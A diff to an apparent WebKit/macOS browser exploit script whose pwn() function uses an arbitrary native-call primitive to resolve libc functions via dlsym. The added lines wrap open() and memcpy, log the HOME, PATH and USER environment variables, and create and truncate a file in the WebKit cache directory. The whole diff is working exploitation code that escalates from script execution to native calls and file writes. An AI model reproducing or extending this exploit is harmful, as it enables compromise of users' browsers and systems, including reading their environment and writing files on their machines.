@@ -432,20 +432,26 @@ function pwn() {
     let getenvAddr = arbCall(dlsymAddr, -2, "getenv");
     let memcpyAddr = arbCall(dlsymAddr, -2, "memcpy");
     let strlenAddr = arbCall(dlsymAddr, -2, "strlen");
+    let openAddr = arbCall(dlsymAddr, -2, "open");
     
     log(`[+] dlsym address: 0x${dlsymAddr.toString(16)}`);
     log(`[+] getenv address: 0x${getenvAddr.toString(16)}`);
     log(`[+] memcpy address: 0x${memcpyAddr.toString(16)}`);
     log(`[+] strlen address: 0x${strlenAddr.toString(16)}`);
+    log(`[+] open address: 0x${openAddr.toString(16)}`);
     
-    function readbuf(addr, size) {
-        let uint8Array = new Uint8Array(size);
-        arbCall(memcpyAddr, uint8Array, addr, size);
-        return uint8Array;
+    function memcpy(destination, source, size) {
+        return arbCall(memcpyAddr, destination, source, size);
     }
     
     function strlen(string) {
         return Number(arbCall(strlenAddr, string));
+    }
+    
+    function readbuf(addr, size) {
+        let uint8Array = new Uint8Array(size);
+        memcpy(uint8Array, addr, size);
+        return uint8Array;
     }
     
     function readString(stringAddr) {
@@ -458,9 +464,27 @@ function pwn() {
         return readString(arbCall(getenvAddr, name));
     }
     
+    function open(path, flags) {
+        return arbCall(openAddr, path, flags)
+    }
+    
     log(`[+] HOME: ${getenv("HOME")}`);
     log(`[+] PATH: ${getenv("PATH")}`);
     log(`[+] USER: ${getenv("USER")}`);
+    
+    let filePath = getenv("HOME") + "/Library/Caches/com.apple.WebKit.WebContent/file.txt";
+    log(`[+] filePath: ${filePath}`);
+    
+    const O_RDWR = 0x0002;
+    const O_CREAT = 0x00000200;
+    const O_TRUNC = 0x00000400;
+        
+    let fd = open(filePath, O_RDWR | O_CREAT | O_TRUNC);
+    if (Number(fd) == 0xFFFFFFFFFFFFFFFF) {
+        log("[+] Failed to open file!");
+        return;
+    }
+    log(`[+] fd: ${fd}`);
 }
 
 function logBytes(array) {
